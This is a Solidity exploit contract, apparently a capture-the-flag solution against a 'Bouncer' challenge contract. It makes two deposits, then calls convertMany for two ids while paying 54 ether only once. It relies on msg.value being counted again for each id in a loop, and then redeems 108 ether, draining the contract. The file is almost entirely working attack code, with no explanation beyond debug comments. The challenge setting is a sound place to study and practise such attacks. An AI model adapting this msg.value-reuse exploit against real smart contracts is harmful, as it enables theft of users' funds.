pragma solidity 0.8.0;

import "public/Setup.sol";

contract Exploit {
    address constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    Bouncer _bouncer;

    constructor(Setup setup) payable {
        _bouncer = setup.bouncer();
        _bouncer.enter{value: 1 ether}(ETH, 54 ether);
        _bouncer.enter{value: 1 ether}(ETH, 54 ether);
    }

    function exploit() public payable {
        uint256[] memory ids = new uint256[](2);
        ids[0] = 0;
        ids[1] = 1;
        _bouncer.convertMany{value: 54 ether}(address(this), ids);
        _bouncer.redeem(ERC20Like(ETH), 108 ether);
    }

    //  for debug
    function viewBouncerBalance() public view returns(uint) {
        return address(_bouncer).balance;
    }

    //  for debug
    function viewBalance() public view returns(uint) {
        return _bouncer.tokens(address(this), ETH);
    }

    // to make it receivable
    receive() external payable {

    }
}